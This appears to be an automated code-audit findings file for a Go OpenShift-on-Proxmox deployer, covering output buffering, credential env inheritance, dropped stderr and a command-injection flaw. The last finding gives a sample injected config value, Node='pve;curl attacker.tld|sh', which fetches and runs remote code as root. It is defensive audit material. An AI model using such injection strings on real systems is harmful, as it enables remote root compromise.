smell: The canonical Executor.Run always buffers stdout and stderr into unbounded bytes.Buffer with no streaming option. Long-running commands routed through this wrapper (terraform apply, openshift-install create ignition-configs, helm upgrade --wait, oc get with large output) retain their entire output in RAM until the child exits — a 6-VM terraform apply can produce tens of MB of text.
evidence:
var stdout, stderr bytes.Buffer
cmd.Stdin = stdin
cmd.Stdout = &stdout
cmd.Stderr = &stderr
severity_reason: rubric §4/canonical-helper-on-critical-path — the wrapper is used by every phase; long-running terraform/openshift-install paths inherit unbounded buffering.
fix_summary: Add a RunStreaming (or Option WithStreaming) variant that tees to an io.Writer supplied by the caller (os.Stdout / slog adapter) while optionally capturing a bounded tail (e.g. last 64KB of stderr via a ring buffer) for error messages. Migrate terraform.Executor.run and helm.RunChecked call sites that produce high-volume output to the streaming variant; leave short-output oc get callers on the buffered variant.
rule_source: Uber Go §Exec: prefer streaming for long-lived subprocesses
must_preserve: Executor.Run's (*Result, error) contract — callers read result.Stdout and result.Stderr. A streaming variant must NOT change the existing signature.

smell: Executor only sets cmd.Env when len(e.Env) > 0, otherwise the subprocess inherits the parent's full environment — including PROXMOX_PASSWORD, PULL_SECRET, PROXMOX_API_TOKEN, and any other credentials the operator exported. A bug or malicious wrapper in terraform / openshift-install / oc plugins could leak these into argv-visible children (e.g. via /proc/self/environ readable by same-uid processes).
severity_reason: rubric §4/credential-exposure — every exec.Command call that doesn't explicitly configure env inherits credentials; the canonical wrapper is the place to fix this once.
fix_summary: Always set cmd.Env explicitly. Build a minimal base (PATH, HOME, LANG, TERM, KUBECONFIG, PROXMOX_*, TF_* allowlist) via an env-allowlist applied by default. Extend WithEnv to be additive on top of the allowlist rather than optional. Document the escape hatch WithInheritedEnv for the one or two callers (doctor, install monitor) that legitimately need full inheritance.
must_preserve: KUBECONFIG propagation used by install.SetupKubeconfig; TerraformEnv plumbing via WithEnv; password-scrubbing invariants in internal/credentials.

smell: terraform Executor.run routes every terraform init/plan/apply/destroy through the buffered internal/executor Run, which materializes the full stdout/stderr of the subprocess in RAM before returning. terraform apply of a 6-VM Proxmox cluster routinely emits >10MB of progress text; the operator also loses streaming progress feedback during a 10-minute apply.
severity_reason: rubric §4/canonical-helper-on-critical-path — terraform apply is the primary long-running subprocess in deploy; buffering hides progress and can OOM on large plans.
fix_summary: Once executor.Executor grows a streaming variant (see sub:7b2829bb:unbounded-output-buffer), switch terraform.Executor.run to the streaming variant with a bounded tail for stderr. Alternatively tee stdout to p.Log via a line-reader goroutine so apply output appears in deploy logs in real time.
must_preserve: terraform.ExecError carries ExitCode and Stderr for typed error handling — streaming variant must still capture enough stderr for error construction.

smell: installTerraform and installHashiCorpDebianRepo call exec.CommandContext directly with .Run() instead of routing through the package-level executor.Executor that is already imported. stderr is discarded, so a dnf config-manager / apt-get update / gpg --dearmor failure bubbles up as a bare wrapped ExitError with no upstream diagnostic text. This is a mixed-idiom file — setup uses p.Exec elsewhere but the repo-setup paths bypass it.
fix_summary: Replace the three direct exec.CommandContext calls (dnf config-manager at L130, gpg --dearmor at L250, apt-get update at L275) with p.Exec.RunChecked, which captures stderr via the canonical executor. The lsb_release -cs case at L254 can stay on Output() or move to p.Exec.Run + result.Stdout.
must_preserve: HashiCorp repo-setup side effects (dearmored key in /usr/share/keyrings, deb list in /etc/apt/sources.list.d).

smell: ConfigureSystemResolver runs nmcli connection modify / nmcli connection up via exec.CommandContext(...).Run() with stdout and stderr both left nil. On failure the user sees a generic wrap of a bare *exec.ExitError with no nmcli diagnostic. This is the same stderr-dropped pattern across four more nmcli/systemctl call sites in this file and six more in firewall.go.
fix_summary: Capture stderr via bytes.Buffer and include its trimmed contents in the wrapped error, mirroring internal/platform/packages.go runCaptured. Better: route these calls through an executor.Executor instance (the phase already has one via system.* helpers) and use RunChecked which captures stderr by default.
must_preserve: best-effort RestoreSystemResolver semantics — errors are warn-logged not returned.

smell: modifyPort, reload, openPort, RemoveRules invoke firewall-cmd / ufw / iptables via exec.CommandContext(...).Run() with stderr dropped. A failing firewall-cmd --add-port returns only the exit error — the operator never sees firewalld's 'ERROR: INVALID_ZONE' or 'COMMAND_FAILED' message. Six sites share the same pattern in this file.
evidence: return exec.CommandContext(ctx, args[0], args[1:]...).Run() //nolint:gosec // validated argv
fix_summary: Extract a small helper runFirewallCmd(ctx, bin, args...) error that captures stderr into a bytes.Buffer and appends it to the wrapped error on non-zero exit. Use it across modifyPort / Reload / UFW delete / UFW allow in this file.
must_preserve: validatePort allowlist on Port.Protocol; per-site //nolint:gosec annotations documenting validated argv.

smell: RemoveSecondaryIP's two nmcli invocations ('connection modify -ipv4.addresses' and 'device reapply') use .Run() with stderr dropped — the only feedback an operator gets is a generic wrap of the exit code, not the nmcli diagnostic. Same pattern as dnsmasq.go.
fix_summary: Capture stderr via bytes.Buffer and include trimmed contents in the wrapped error. Or lift to an executor.Executor passed in via a NetworkManager struct (constructor injection is consistent with the other subprocess-using packages).
must_preserve: caller-supplied ip/iface non-empty validation at function entry.

smell: IsInstalled uses cmd.Output() — stderr is dropped — and returns false on any non-nil error. This conflates 'package not installed' (rpm exits 1) with 'rpm/dpkg is broken on this host' or 'ctx cancelled'. Callers (Remove's pre-filter, assertion sites) silently treat a broken package manager as 'not installed', potentially skipping removals that should have run.
fix_summary: Distinguish the ExitError (package not installed → ok, return false) from other errors (ctx.Err, LookPath failure, io error → propagate). Change the signature to (bool, error) and have callers treat non-exit errors as abort conditions. Alternatively capture stderr and log at debug level when query fails for non-exit reasons so an operator can diagnose the silent skip.
must_preserve: queryMatch semantics for dpkg -l (ii prefix filter for purged-but-listed packages).

smell: configureSELinuxForApache discards both the result and error of two semanage port invocations via '_, _ = p.Exec.Run(...)'. The comment 'Try -a first; if port already exists, -m modifies' covers the expected case, but any other semanage failure (policy not loaded, selinux in disabled state, perms) is invisible — apache then silently binds 8080 with no SELinux label and may later refuse connections.
fix_summary: Capture result of the -m call and log result.Stderr at warn level if exit != 0. The -a fallback-to-error pattern is fine, but the final state should be checked; a single 'semanage port -l | grep 8080' probe would confirm the policy was applied and surface any real failure.
rule_source: Go proverb: errors are values — handle them
repo counter-example: p.Log.Warn on apache.configureApachePort failures
must_preserve: the -a then -m ordering (first-add-then-modify) must stay to handle both fresh and pre-labeled hosts.

smell: ValidateDnsmasqConfig runs 'dnsmasq --test' via .Run() — both stdout and stderr are discarded. dnsmasq --test prints its syntax-error lines to stderr; dropping them means a config-validation failure returns only 'exit status 1' to the caller with no line number or message.
fix_summary: Wrap with stderr capture: allocate a bytes.Buffer, assign cmd.Stderr, and include strings.TrimSpace(stderr.String()) in the returned error. dnsmasq --test's stderr is concise (one line per bad directive) so no bound needed.
must_preserve: function signature (context.Context) error — the validation probe is used from multiple phases.

smell: listProxmoxVMIDs and vmConfigReferencesISO build the remote shell command via fmt.Sprintf with p.Node (free-form YAML-config string) interpolated via %s — 'pvesh get /nodes/%s/qemu --output-format json'. The command is passed to SSHRun which invokes 'ssh root@host <cmd>' (remote shell parses the string). Unlike isoDir — which validateISODir rejects on shell metacharacters before interpolation — p.Node has no allowlist at this site (config.Validate today does not enforce a charset on Provider.Proxmox.Node). A config typo or malicious YAML with Node='pve;curl attacker.tld|sh' executes as root on the Proxmox host.
severity_reason: rubric §4/known-exploit-path — CWE-78 on a remote-root channel; attack requires only config-file write access, which is weak in a multi-operator deploy model. Contained to local-privileged vector because attacker already has config access.
fix_summary: Two fixes, either sufficient: (1) add validateProxmoxNode(name string) error at the config boundary rejecting anything outside [A-Za-z0-9_.-]{1,63}, and call it from config.Validate — mirrors validateConfigName in dns/dnsmasq.go:L41-L48. (2) wrap p.Node through shellSingleQuote before interpolation — less defensive but localized. Preferred is (1); it composes with the remote-shell pattern the rest of iso_cleanup.go already enforces for isoDir.
must_preserve: pvesh API shape (/nodes/<node>/qemu[/<vmid>/config]) — validator must accept valid Proxmox node names.
